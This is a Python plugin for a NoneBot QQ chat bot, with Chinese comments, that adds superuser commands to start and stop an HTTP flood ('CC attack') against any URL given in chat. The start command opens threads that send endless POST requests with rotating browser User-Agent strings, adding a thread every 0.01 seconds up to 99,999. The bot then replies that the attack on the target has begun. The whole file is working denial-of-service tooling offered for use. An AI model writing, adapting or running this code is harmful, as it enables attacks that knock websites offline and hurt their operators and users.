import requests
import threading
import random
import time
from nonebot import on_command
from nonebot.adapters.onebot.v11 import Bot, Event, Message, MessageSegment
from nonebot.params import CommandArg
from nonebot.permission import SUPERUSER

# 全局变量
attack_running = False
threads = []
target_url = ""
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
]

# 模拟的请求函数
def send_request(url: str):
    while attack_running:
        try:
            headers = {"User-Agent": random.choice(user_agents)}
            data = {'key': 'value'}  # 小数据
            response = requests.post(url, headers=headers, data=data)
            print(f"Response code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Request failed: {e}")
        time.sleep(random.uniform(0.1, 1.0))  # 随机延迟

# 启动CC攻击命令
cc_start = on_command("cc_start", permission=SUPERUSER, block=True)

@cc_start.handle()
async def _(bot: Bot, event: Event, args: Message = CommandArg()):
    global attack_running, threads, target_url
    if attack_running:
        original_message_id = event.message_id
        reply_message = MessageSegment.reply(original_message_id) + "攻击已经在运行中。"
        await cc_start.finish(reply_message)
    
    target_url = str(args).strip()
    if target_url:
        attack_running = True
        initial_thread_count = 10
        max_thread_count = 99999
        increase_interval = 0.01

        # 创建初始线程并启动
        for i in range(initial_thread_count):
            t = threading.Thread(target=send_request, args=(target_url,))
            t.start()
            threads.append(t)

        # 定期增加线程
        def increase_threads():
            global attack_running
            while len(threads) < max_thread_count and attack_running:
                time.sleep(increase_interval)
                t = threading.Thread(target=send_request, args=(target_url,))
                t.start()
                threads.append(t)
                print(f"增加线程，当前线程数量: {len(threads)}")

        threading.Thread(target=increase_threads).start()
        original_message_id = event.message_id
        reply_message = MessageSegment.reply(original_message_id) + f"已开始向 {target_url} 发起攻击。"
        await cc_start.finish(reply_message)
    else:
        original_message_id = event.message_id
        reply_message = MessageSegment.reply(original_message_id) + "请输入目标URL。"
        await cc_start.finish(reply_message)

# 停止CC攻击命令
cc_stop = on_command("cc_stop", permission=SUPERUSER, block=True)

@cc_stop.handle()
async def _(bot: Bot, event: Event):
    global attack_running, threads
    if attack_running:
        attack_running = False
        for t in threads:
            t.join()  # 等待线程终止
        threads = []
        original_message_id = event.message_id
        reply_message = MessageSegment.reply(original_message_id) + "攻击已停止。"
        await cc_stop.finish(reply_message)
    else:
        original_message_id = event.message_id
        reply_message = MessageSegment.reply(original_message_id) + "攻击没有运行。"
        await cc_stop.finish(reply_message)
